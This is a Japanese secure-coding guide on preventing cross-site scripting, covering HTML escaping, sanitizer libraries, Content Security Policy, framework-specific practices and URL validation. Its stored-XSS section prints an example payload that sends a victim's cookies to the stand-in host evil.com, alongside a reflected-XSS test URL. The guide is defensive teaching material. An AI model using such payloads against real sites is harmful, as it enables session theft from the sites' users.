# XSS（クロスサイトスクリプティング）対策

## 概要

XSS攻撃を防止するための包括的なガイドです。
HTMLエスケープ、CSP、サニタイザーライブラリの活用方法を解説します。

## XSSの種類

### 1. Stored XSS（蓄積型）

悪意のあるスクリプトがサーバーに保存され、他のユーザーに提供される。

```typescript
// 攻撃例: コメント投稿
const maliciousComment =
  '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';

// ❌ 危険: そのまま表示
element.innerHTML = comment;

// ✅ 安全: エスケープして表示
element.textContent = comment;
```

### 2. Reflected XSS（反射型）

URLパラメータなどの入力が即座にレスポンスに反映される。

```typescript
// 攻撃URL: example.com/search?q=<script>alert('XSS')</script>

// ❌ 危険
const query = new URLSearchParams(window.location.search).get("q");
document.getElementById("result").innerHTML = `検索結果: ${query}`;

// ✅ 安全
document.getElementById("result").textContent = `検索結果: ${query}`;
```

### 3. DOM-based XSS

クライアントサイドのJavaScriptがDOMを操作する際に発生。

```typescript
// ❌ 危険なシンク
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
eval(userInput);

// ✅ 安全なシンク
element.textContent = userInput;
element.setAttribute("data-value", userInput);
```

## HTMLエスケープ

### 基本的なエスケープ関数

```typescript
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// 使用例
const userInput = '<script>alert("XSS")</script>';
const safe = escapeHtml(userInput);
// 結果: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
```

### コンテキストに応じたエスケープ

```typescript
// HTMLコンテキスト
function escapeHtmlContent(input: string): string {
  return input.replace(
    /[&<>"']/g,
    (char) =>
      ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#x27;",
      })[char] || char,
  );
}

// 属性コンテキスト
function escapeHtmlAttribute(input: string): string {
  return input.replace(
    /[&<>"'\n\r]/g,
    (char) =>
      ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#x27;",
        "\n": "&#x0a;",
        "\r": "&#x0d;",
      })[char] || char,
  );
}

// URLコンテキスト
function escapeUrl(input: string): string {
  return encodeURIComponent(input);
}

// JavaScriptコンテキスト（非推奨：可能な限り避ける）
function escapeJavaScript(input: string): string {
  return JSON.stringify(input).slice(1, -1);
}
```

## サニタイザーライブラリ

### DOMPurify

```typescript
import DOMPurify from "dompurify";

// 基本的な使用
const clean = DOMPurify.sanitize(dirty);

// HTMLのみ許可（スクリプト除去）
const cleanHtml = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
  ALLOWED_ATTR: ["href", "title"],
});

// 設定例：リッチテキストエディタ用
const richTextConfig = {
  ALLOWED_TAGS: [
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "p",
    "br",
    "hr",
    "ul",
    "ol",
    "li",
    "blockquote",
    "pre",
    "code",
    "a",
    "img",
    "strong",
    "em",
    "u",
    "s",
    "table",
    "thead",
    "tbody",
    "tr",
    "th",
    "td",
  ],
  ALLOWED_ATTR: ["href", "src", "alt", "title", "class"],
  ALLOW_DATA_ATTR: false,
};

const cleanRichText = DOMPurify.sanitize(dirty, richTextConfig);
```

### sanitize-html（Node.js）

```typescript
import sanitizeHtml from "sanitize-html";

const clean = sanitizeHtml(dirty, {
  allowedTags: ["b", "i", "em", "strong", "a"],
  allowedAttributes: {
    a: ["href"],
  },
  allowedSchemes: ["http", "https", "mailto"],
});
```

## Content Security Policy (CSP)

### 基本的なCSPヘッダー

```typescript
// Express.js
import helmet from "helmet";

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameAncestors: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: [],
    },
  }),
);
```

### CSPディレクティブ一覧

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  form-action 'self';
  base-uri 'self';
  object-src 'none';
```

### Nonceベースのスクリプト許可

```typescript
import crypto from "crypto";

// ノンス生成
function generateNonce(): string {
  return crypto.randomBytes(16).toString("base64");
}

// Express middleware
app.use((req, res, next) => {
  res.locals.nonce = generateNonce();
  res.setHeader(
    "Content-Security-Policy",
    `script-src 'self' 'nonce-${res.locals.nonce}'`,
  );
  next();
});

// テンプレートでの使用
// <script nonce="<%= nonce %>">...</script>
```

## フレームワーク別対策

### React

```tsx
// ✅ 自動エスケープ（デフォルトで安全）
function SafeComponent({ userInput }: { userInput: string }) {
  return <div>{userInput}</div>;
}

// ⚠️ 危険：dangerouslySetInnerHTMLを使う場合は必ずサニタイズ
import DOMPurify from "dompurify";

function RichTextComponent({ html }: { html: string }) {
  return (
    <div
      dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(html),
      }}
    />
  );
}

// ✅ href属性の検証
function SafeLink({
  url,
  children,
}: {
  url: string;
  children: React.ReactNode;
}) {
  const safeUrl = url.startsWith("javascript:") ? "#" : url;
  return <a href={safeUrl}>{children}</a>;
}
```

### Vue.js

```vue
<template>
  <!-- ✅ 自動エスケープ -->
  <div>{{ userInput }}</div>

  <!-- ⚠️ v-htmlは危険 -->
  <div v-html="sanitizedHtml"></div>
</template>

<script setup lang="ts">
import DOMPurify from "dompurify";
import { computed } from "vue";

const props = defineProps<{
  userInput: string;
  rawHtml: string;
}>();

const sanitizedHtml = computed(() => DOMPurify.sanitize(props.rawHtml));
</script>
```

## URLの検証

```typescript
// URLスキームの検証
function isValidUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ["http:", "https:", "mailto:"].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// JavaScript URLの検出
function isSafeUrl(url: string): boolean {
  const lowerUrl = url.toLowerCase().trim();
  if (lowerUrl.startsWith("javascript:")) return false;
  if (lowerUrl.startsWith("data:")) return false;
  if (lowerUrl.startsWith("vbscript:")) return false;
  return true;
}

// 安全なリンク生成
function createSafeLink(url: string): string {
  if (!isSafeUrl(url)) {
    return "#";
  }
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    return `https://${url}`;
  }
  return url;
}
```

## ベストプラクティス

### 1. 出力エンコーディング

```typescript
// コンテキストに応じたエンコーディング
const contexts = {
  html: (s: string) => escapeHtml(s),
  attribute: (s: string) => escapeHtmlAttribute(s),
  url: (s: string) => encodeURIComponent(s),
  javascript: (s: string) => JSON.stringify(s),
  css: (s: string) => CSS.escape(s),
};
```

### 2. HTTPヘッダー設定

```typescript
// セキュリティヘッダー
app.use((req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("X-XSS-Protection", "1; mode=block");
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
  next();
});
```

### 3. Cookie設定

```typescript
// セキュアなCookie設定
res.cookie("session", sessionId, {
  httpOnly: true, // JavaScript からアクセス不可
  secure: true, // HTTPS のみ
  sameSite: "strict", // CSRF 対策
  maxAge: 3600000, // 1時間
});
```

## 変更履歴

| バージョン | 日付       | 変更内容     |
| ---------- | ---------- | ------------ |
| 1.0.0      | 2025-11-25 | 初版リリース |
